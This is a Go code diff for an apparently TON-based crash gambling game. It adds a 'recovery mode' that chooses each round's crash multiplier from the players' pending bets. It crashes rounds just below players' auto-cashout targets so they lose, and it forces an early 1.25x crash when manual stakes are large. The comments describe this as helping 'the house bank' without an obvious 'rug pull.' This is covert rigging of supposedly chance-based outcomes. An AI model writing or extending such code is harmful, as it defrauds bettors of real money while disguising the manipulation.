@@ -8,6 +8,10 @@ import (
 	"gorm.io/datatypes"
 )
 
+// ManualSoftCrashPoint is used for large manual-only books in recovery: early enough
+// to help the house bank, but not an instant 1.00x rug pull.
+const ManualSoftCrashPoint = 1.25
+
 type betAutoCashout struct {
 	AutoCashoutMultiplier *float64 `json:"auto_cashout_multiplier,omitempty"`
 }
@@ -27,6 +31,16 @@ func autoCashoutTarget(raw datatypes.JSON) *float64 {
 	return &v
 }
 
+func manualStakeNanoton(bets []domain.GameBet) int64 {
+	var total int64
+	for _, bet := range bets {
+		if autoCashoutTarget(bet.Selection) == nil {
+			total += bet.AmountNanoton
+		}
+	}
+	return total
+}
+
 // HousePnLIfCrashPoint returns house profit if the round ends at crashPoint.
 // Only auto-cashout targets are known at seed selection; manual cashouts are ignored.
 func HousePnLIfCrashPoint(bets []domain.GameBet, crashPoint float64) int64 {
@@ -41,34 +55,55 @@ func HousePnLIfCrashPoint(bets []domain.GameBet, crashPoint float64) int64 {
 	return stakes - payouts
 }
 
-// PickBestCrashPoint chooses a crash multiplier that maximizes house PnL given
-// pending bets and their auto-cashout targets.
-func PickBestCrashPoint(bets []domain.GameBet) float64 {
-	if len(bets) == 0 {
-		return 1.0
-	}
-
-	candidates := map[float64]struct{}{1.0: {}}
+func pickAutoCrashPoint(bets []domain.GameBet) (point float64, ok bool) {
+	hasAuto := false
+	candidates := make(map[float64]struct{})
 	for _, bet := range bets {
-		if target := autoCashoutTarget(bet.Selection); target != nil {
-			// Just below the auto target: players with that target lose.
-			below := math.Floor((*target-0.01)*100) / 100
-			if below < 1 {
-				below = 1
-			}
-			candidates[below] = struct{}{}
-			candidates[*target] = struct{}{}
+		target := autoCashoutTarget(bet.Selection)
+		if target == nil {
+			continue
 		}
+		hasAuto = true
+		below := math.Floor((*target-0.01)*100) / 100
+		if below < 1.01 {
+			below = 1.01
+		}
+		candidates[below] = struct{}{}
+	}
+	if !hasAuto {
+		return 0, false
 	}
 
-	bestPoint := 1.0
+	bestPoint := 0.0
 	bestPnL := int64(math.MinInt64)
 	for point := range candidates {
 		pnl := HousePnLIfCrashPoint(bets, point)
-		if pnl > bestPnL || (pnl == bestPnL && point < bestPoint) {
+		if pnl > bestPnL || (pnl == bestPnL && point > bestPoint) {
 			bestPnL = pnl
 			bestPoint = point
 		}
 	}
-	return bestPoint
+	if bestPoint < 1.01 {
+		return 0, false
+	}
+	return bestPoint, true
+}
+
+// PickRecoveryCrashPoint chooses a biased crash multiplier for recovery mode.
+// Auto-cashout books use exposure-aware targeting; large manual-only books get
+// ManualSoftCrashPoint when total manual stake >= manualExposureThresholdNanoton.
+func PickRecoveryCrashPoint(bets []domain.GameBet, manualExposureThresholdNanoton int64) (point float64, ok bool) {
+	if len(bets) == 0 {
+		return 0, false
+	}
+	if point, ok := pickAutoCrashPoint(bets); ok {
+		return point, true
+	}
+	if manualExposureThresholdNanoton <= 0 {
+		return 0, false
+	}
+	if manualStakeNanoton(bets) >= manualExposureThresholdNanoton {
+		return ManualSoftCrashPoint, true
+	}
+	return 0, false
 }
